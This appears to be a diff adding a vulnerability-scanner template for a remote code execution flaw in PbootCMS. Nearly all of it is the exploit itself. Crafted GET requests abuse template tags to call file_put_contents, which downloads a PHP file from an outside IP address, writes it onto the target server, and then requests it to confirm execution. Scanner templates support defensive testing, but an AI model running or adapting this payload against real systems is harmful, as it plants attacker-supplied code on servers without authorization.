@@ -1,0 +1,47 @@
+id: pbootcms-rce
+
+info:
+  name: pbootcms-rce
+  author: ChiragArtani
+  severity: high
+  description: |
+    This template checks for Local File Inclusion (LFI) vulnerability with potential remote code execution.
+    The initial request checks for a specific regex in the response and if found, a second request is made 
+    to verify the RCE by checking for a specific string in the included file.
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /?tag&tagstpl=news.html&tag=%7Bpbohome/Indexot:if((get/*-*/(/**/t))/**/(get/*-*/(/**/t1),get/*-*/(/**/t2)(get/*-*/(/**/t3))))%7Dok%7B/pbohome/Indexot:if%7D&t=file_put_contents&t1=runtime/complile/testme.php&t2=file_get_contents&t3=http://167.71.230.48:8000/kishore.php HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /?tag&tagstpl=news.html&tag=%7Bpbohome/Indexot:if((get/*-*/(/**/t))/**/(get/*-*/(/**/t1),get/*-*/(/**/t2)(get/*-*/(/**/t3))))%7Dok%7B/pbohome/Indexot:if%7D&t=file_put_contents&t1=testme.php&t2=file_get_contents&t3=http://167.71.230.48:8000/kishore.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: regex
+        regex:
+          - "\\{content:title\\}"
+
+  - raw:
+      - |
+        GET /runtime/complile/testme.php HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /testme.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        regex:
+          - "kishore1337"
